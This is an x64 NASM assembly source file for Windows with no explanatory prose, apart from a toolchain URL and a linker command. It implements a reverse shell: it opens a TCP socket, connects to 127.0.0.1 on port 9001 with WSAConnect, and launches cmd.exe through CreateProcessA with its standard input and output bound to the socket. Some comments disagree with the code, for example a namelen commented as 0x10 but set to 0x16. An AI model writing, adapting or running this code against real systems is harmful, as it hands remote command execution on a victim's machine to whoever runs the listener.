;https://github.com/brechtsanders/winlibs_mingw/releases/download/14.2.0posix-19.1.1-12.0.0-ucrt-r2/winlibs-x86_64-posix-seh-gcc-14.2.0-llvm-19.1.1-mingw-w64ucrt-12.0.0-r2.zip
;ld -m i386pep -LC:\Users\[username]\Desktop\mingw64\x86_64-w64-mingw32\lib asmsock.obj -o asmsock.exe -lws2_32 -lkernel32

BITS 64
section .text
global main

extern WSAStartup
extern WSASocketA
extern WSAConnect
extern CreateProcessA
extern ExitProcess

main:
    ; Call WSAStartup
	and rsp, 0xFFFFFFFFFFFFFFF0
    xor rcx, rcx
    mov cx, 0x198
    sub rsp, rcx         ;Reserve enough space for the lpWSDATA structure
    lea rdx, [rsp]       ;Assign the address of lpWSAData to the RDX register as the 2nd parameter
    mov cx, 0x202        ;Assign 0x202 to wVersionRequired and store it in RCX as the 1st parameter
    sub rsp, 0x28    
    call WSAStartup
    add rsp, 0x30
	
    ; Create a socket 
    xor rcx, rcx            ;"
    mov cl, 2               ;"        # AF is 2 as the 1st parameter
    xor rdx, rdx            ;"
    mov dl, 1               ;"        # Type is 1 as the 2nd parameter
    xor r8, r8              ;"
    mov r8b, 6              ;"        # Protocol is 6 as the 3rd parameter
    xor r9, r9              ;"        # lpProtocolInfo is 0 as the 4th parameter
    mov [rsp+0x20], r9      ;"        # g is 0 as the 5th parameter, stored on the stack
    mov [rsp+0x28], r9      ;"        # dwFlags is 0 as the 6th parameter, stored on the stack
    call WSASocketA         ;"        # Call WSASocketA function
    mov r12, rax            ;"        # Save the returned socket type return value in R12 to prevent data loss in RAX
    add rsp, 0x30           ;"        # Function epilogue
         
    ; Store SOCKET handle
    mov r13, rax                    ; Store SOCKET handle in RDI for later use

    mov rcx, r13                ;    Our socket handle as parameter 1
    sub rsp,0x208               ;    Make some room on the stack
    xor rax,rax                 ;
    inc rax                     ;
    inc rax                     ;
    mov [rsp], rax              ; AF_INET = 2
    mov rax, 0x2923             ; Port 9001
    mov [rsp+2], rax            ; Port
    mov rax, 0x0100007F         ; IP 127.0.0.1
    mov [rsp+4], rax            ; IP
    lea rdx,[rsp]               ; Save our pointer to RDX
    mov r8, 0x16                ; Move 0x10 to namelen
    xor r9,r9             
    push r9                     ; NULL lpCallerData
    push r9                     ; NULL lpCallerData
    push r9                     ; NULL lpSQOS
    sub rsp, 0x90               ; NULL lpSQOS
    call WSAConnect             ; Call WSAConnect

    mov rax, 0x6578652e646d63     ; Push cmd.exe string to stack
    push rax                      
    mov rcx, rsp                  ; RCX = lpApplicationName (cmd.exe)
 
    ; STARTUPINFOA Structure
    push r13;"                     # Push STDERROR
    push r13;"                     # Push STDOUTPUT
    push r13;"                     # Push STDINPUT
    xor rax,rax; "
    push ax;"
    push rax;"
    push rax;"
    mov rax, 0x100;"
    push ax;"
    xor rax,rax;"
    push ax;"
    push ax;"
    push rax;"
    push rax; "                    # dwXSize = NULL
    push rax; "                    # dwY = NULL
    push rax; "                    # dwX = NULL
    push rax; "                    # lpDesktop = NULL
    push rax; "                    # lpReserved = NULL
    mov rax, 0x68;"                
    push rax;"                     # SizeOfStruct = 0x68
    mov rdi,rsp;"                  # Copy the Pointer to RDI

    ; Call CreateProcessA
    mov rax, rsp;"                # Get current stack pointer
    sub rax, 0x500;"
    push rax; "                   # ProcessInfo
    push rdi; "                   # StartupInfo          = Pointer to STARTUPINFOA
    xor rax, rax; "
    push rax; "                   # lpCurrentDirectory   = NULL
    push rax; "                   # lpEnvironment        = NULL
    push rax;"                   
    inc rax;  "
    push rax; "                   # bInheritHandles      = 1
    xor rax, rax; "
    push rax;"
    push rax;"
    push rax;"
    push rax; "                   # dwCreationFlags      = NULL
    mov r8, rax; "                # lpThreadAttributes   = NULL              
    mov r9, rax; "                # lpProcessAttributes  = NULL              
    mov rdx, rcx; "               # lpCommandLine        = "cmd.exe" string  
    mov rcx, rax; "               # lpApplicationName    = NULL              
    call CreateProcessA            ; "                   # Call CreateProcessA

    ; Clean exit
    mov rcx, 0
    call ExitProcess
